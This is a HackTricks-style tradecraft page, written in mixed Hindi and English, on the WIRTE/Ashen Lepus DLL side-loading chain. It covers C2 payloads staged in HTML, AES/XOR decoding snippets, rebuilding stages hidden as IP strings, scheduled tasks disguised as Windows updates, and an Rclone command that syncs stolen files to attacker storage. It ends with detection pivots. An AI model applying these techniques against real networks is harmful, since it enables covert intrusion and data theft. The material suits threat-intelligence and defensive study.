# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) ने एक repeatable pattern weaponized किया जो DLL sideloading, staged HTML payloads, और modular .NET backdoors को chain करके Middle Eastern diplomatic networks में persist करता है। यह technique किसी भी operator द्वारा reusable है क्योंकि यह इन पर rely करती है:

- **Archive-based social engineering**: benign PDFs targets को file-sharing site से RAR archive pull करने के लिए instruct करते हैं। Archive में एक real-looking document viewer EXE, एक malicious DLL जो trusted library के नाम पर है (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), और एक decoy `Document.pdf` bundle किया जाता है।
- **DLL search order abuse**: victim EXE पर double-click करता है, Windows current directory से DLL import resolve करता है, और malicious loader (AshenLoader) trusted process के अंदर execute होता है जबकि decoy PDF open होकर suspicion कम करता है।
- **Living-off-the-land staging**: हर बाद का stage (AshenStager → AshenOrchestrator → modules) जरूरत तक disk पर नहीं रखा जाता, बल्कि harmless दिखने वाले HTML responses के अंदर छिपे encrypted blobs के रूप में deliver किया जाता है।

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader को side-load करता है, जो host recon करता है, AES-CTR से उसे encrypt करता है, और उसे rotating parameters जैसे `token=`, `id=`, `q=`, या `auth=` के साथ API-जैसे paths (e.g., `/api/v2/account`) में POST करता है।
2. **HTML extraction**: C2 next stage तभी reveal करता है जब client IP target region में geolocate होता है और `User-Agent` implant से match करता है, जिससे sandboxes frustrate होते हैं। Checks pass होने पर HTTP body में `<headerp>...</headerp>` blob होता है, जिसमें Base64/AES-CTR encrypted AshenStager payload होता है।
3. **Second sideload**: AshenStager को एक और legitimate binary के साथ deploy किया जाता है जो `wtsapi32.dll` import करता है। Binary में injected malicious copy और अधिक HTML fetch करती है, इस बार `<article>...</article>` carve करके AshenOrchestrator recover किया जाता है।
4. **AshenOrchestrator**: एक modular .NET controller जो Base64 JSON config decode करता है। Config के `tg` और `au` fields concatenate/hash होकर AES key बनाते हैं, जो `xrk` decrypt करती है। Resulting bytes इसके बाद fetched हर module blob के लिए XOR key की तरह act करते हैं।
5. **Module delivery**: हर module HTML comments के माध्यम से describe किया जाता है जो parser को arbitrary tag की ओर redirect करते हैं, जिससे static rules जो केवल `<headerp>` या `<article>` देखते हैं, break हो जाते हैं। Modules में persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), और file exploration (`FE`) शामिल हैं।

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
भले ही defender किसी specific element को block या strip कर दें, operator को सिर्फ HTML comment में hint किए गए tag को बदलना होता है ताकि delivery फिर से शुरू हो सके।

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

हालिया HTML smuggling शोध (Talos) HTML attachments में `<script>` blocks के अंदर Base64 strings के रूप में छिपे payloads और JavaScript के जरिए runtime पर decode किए जाने को highlight करता है। यही trick C2 responses के लिए भी reuse की जा सकती है: script tag (या किसी अन्य DOM element) के अंदर encrypted blobs stage करें और AES/XOR से पहले उन्हें in-memory decode करें, जिससे page साधारण HTML जैसा दिखे। Talos layered obfuscation भी दिखाता है (identifier renaming plus Base64/Caesar/AES) script tags के अंदर, जो HTML-staged C2 blobs पर सीधे लागू होता है। **hidden text salting** पर Talos का बाद का writeup भी यहाँ relevant है: irrelevant HTML comments या whitespace के साथ Base64 को split करना simple regex extractors को तोड़ने के लिए पर्याप्त है, जबकि browser-side reconstruction trivial रहती है।

## Recent Variant Notes (2024-2025)

- Check Point ने 2024 में WIRTE campaigns देखे जो अभी भी archive-based sideloading पर आधारित थे लेकिन पहले stage के रूप में `propsys.dll` (stagerx64) का उपयोग करते थे। stager next payload को Base64 + XOR (key `53`) के साथ decode करता है, hardcoded `User-Agent` के साथ HTTP requests भेजता है, और HTML tags के बीच embedded encrypted blobs को extract करता है। एक branch में, stage को embedded IP strings की लंबी list से reconstruct किया गया था, जिन्हें `RtlIpv4StringToAddressA` से decode किया गया, फिर उन्हें payload bytes में concatenate किया गया।
- OWN-CERT ने पहले के WIRTE tooling का दस्तावेज़ीकरण किया जहाँ side-loaded `wtsapi32.dll` dropper strings को Base64 + TEA से protect करता था और DLL name को ही decryption key के रूप में उपयोग करता था, फिर C2 को भेजने से पहले host identification data को XOR/Base64 से obfuscate करता था।

## Reconstructing IP-Encoded Stages

WIRTE के 2024 `propsys.dll` branch से पता चलता है कि next PE को एक contiguous HTML blob के रूप में रहने की ज़रूरत नहीं है। loader stage bytes को dotted-quad strings के रूप में stash कर सकता है और उन्हें `RtlIpv4StringToAddressA` के साथ rebuild कर सकता है, जो Hive की **IPfuscation** tradecraft से closely related pattern है। Operationally यह तब उपयोगी है जब actor चाहता है कि HTML page में एक obvious Base64 payload के बजाय harmless IOCs या config data जैसा कुछ दिखे।
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
यदि recovered bytes `MZ` से शुरू होते हैं, तो आपने likely अगला PE सीधे reconstruct कर लिया। यदि नहीं, तो leading XOR/Base64 layer या addresses के बीच छोटे delimiter chunks की जाँच करें।

## Swappable DLL Names & Host Rotation

इस pattern की एक मजबूत property यह है कि **HTML/AES/XOR staging backend identical रह सकता है जबकि केवल sideload pair बदलता है**। WIRTE ने campaigns के दौरान `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, और `propsys.dll` को rotate किया, जो उपयोगी है क्योंकि:

- `propsys.dll` और `wtsapi32.dll` boring Windows DLL names हैं जिन्हें defenders `%System32%` / `%SysWOW64%` में मौजूद होने की उम्मीद करते हैं।
- **HijackLibs** जैसे public catalogs पहले से ही कई binaries को map करते हैं जो application directory की copied instance से उन DLL names को load करेंगे, जिससे operators को stager redesign किए बिना replacement hosts मिल जाते हैं।
- केवल export surface को हर host के लिए adapt करना होता है। HTML parser, AES/XOR routines, और module loader को आमतौर पर forwarding proxy DLL में बिना बदलाव के transplant किया जा सकता है।

Offensive lab work के लिए, इसका मतलब है कि आप समस्या को **(1) एक stable signed host खोजें जो आपके चुने गए DLL name को locally resolve करता हो** और **(2) उसी DLL के पीछे वही staged-HTML loader logic reuse करें** में विभाजित कर सकते हैं।

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders 256-bit keys plus nonces embed करते हैं (e.g., `{9a 20 51 98 ...}`) और optionally `msasn1.dll` जैसी strings का उपयोग करके decryption से पहले/बाद एक XOR layer जोड़ते हैं।
- **Key material variations**: earlier loaders ने embedded strings को protect करने के लिए Base64 + TEA का उपयोग किया, जिसमें decryption key malicious DLL name से derive की गई थी (e.g., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging servers tool के अनुसार अलग-अलग हैं, varying ASNs में hosted हैं, और कभी-कभी legitimate-looking subdomains के साथ front किए जाते हैं, इसलिए एक stage को burn करने से बाकी expose नहीं होते।
- **Recon smuggling**: enumerated data अब Program Files listings भी शामिल करती है ताकि high-value apps पहचाने जा सकें और host से बाहर जाने से पहले हमेशा encrypted होती है।
- **URI churn**: query parameters और REST paths campaigns के बीच rotate होते हैं (`/api/v1/account?token=` → `/api/v2/account?auth=`), जिससे brittle detections invalid हो जाती हैं।
- **User-Agent pinning + safe redirects**: C2 infrastructure केवल exact UA strings पर respond करती है और otherwise benign news/health sites पर redirect कर देती है ताकि normal traffic में blend हो सके।
- **Gated delivery**: servers geo-fenced हैं और केवल real implants को जवाब देते हैं। Unapproved clients को unsuspicious HTML मिलता है।

## Persistence & Execution Loop

AshenStager scheduled tasks drop करता है जो Windows maintenance jobs की तरह masquerade करते हैं और `svchost.exe` के जरिए execute होते हैं, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

ये tasks boot पर या intervals पर sideloading chain को relaunch करते हैं, जिससे AshenOrchestrator disk को फिर से touch किए बिना fresh modules request कर सकता है।

## Using Benign Sync Clients for Exfiltration

Operators diplomatic documents को `C:\Users\Public` में stage करते हैं (world-readable और non-suspicious) एक dedicated module के जरिए, फिर उस directory को attacker storage के साथ synchronize करने के लिए legitimate [Rclone](https://rclone.org/) binary डाउनलोड करते हैं। Unit42 note करता है कि इस actor को exfiltration के लिए Rclone इस्तेमाल करते हुए पहली बार देखा गया है, जो legitimate sync tooling के दुरुपयोग की broader trend के अनुरूप है ताकि normal traffic में blend किया जा सके:

1. **Stage**: target files को `C:\Users\Public\{campaign}\` में copy/collect करें।
2. **Configure**: attacker-controlled HTTPS endpoint की ओर point करने वाली Rclone config ship करें (e.g., `api.technology-system[.]com`).
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` चलाएँ ताकि traffic normal cloud backups जैसा लगे।

क्योंकि Rclone legitimate backup workflows में widely used है, defenders को anomalous executions (new binaries, odd remotes, या `C:\Users\Public` की sudden syncing) पर focus करना चाहिए।

## Detection Pivots

- **Signed processes** पर alert करें जो unexpectedly user-writable paths से DLLs load करते हैं (Procmon filters + `Get-ProcessMitigation -Module`), खासकर जब DLL names `netutils`, `srvcli`, `dwampi`, `wtsapi32`, या `propsys` से overlap करते हों।
- Suspicious HTTPS responses में **large Base64 blobs embedded inside unusual tags** या `<!-- TAG: <xyz> -->` comments द्वारा guarded content inspect करें।
- पहले HTML normalize करें: **Base64 extraction से पहले comments strip करें और whitespace collapse करें**, क्योंकि hidden-text-salting style evasion payload को comment boundaries के across split कर सकती है।
- HTML hunting को `<script>` blocks के अंदर मौजूद **Base64 strings** तक extend करें (HTML smuggling-style staging) जिन्हें AES/XOR processing से पहले JavaScript द्वारा decode किया जाता है।
- **`RtlIpv4StringToAddressA` के repeated calls के बाद buffer assembly** की खोज करें, खासकर जब surrounding strings real network targets के बजाय long IPv4 lists हों।
- **Scheduled tasks** की खोज करें जो `svchost.exe` को non-service arguments के साथ चलाते हैं या dropper directories की ओर point करते हैं।
- ऐसे **C2 redirects** ट्रैक करें जो केवल exact `User-Agent` strings के लिए payload return करते हैं और otherwise legitimate news/health domains पर bounce करते हैं।
- IT-managed locations के बाहर दिखाई देने वाले **Rclone** binaries, नए `rclone.conf` files, या `C:\Users\Public` जैसे staging directories से pull करने वाले sync jobs monitor करें।

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
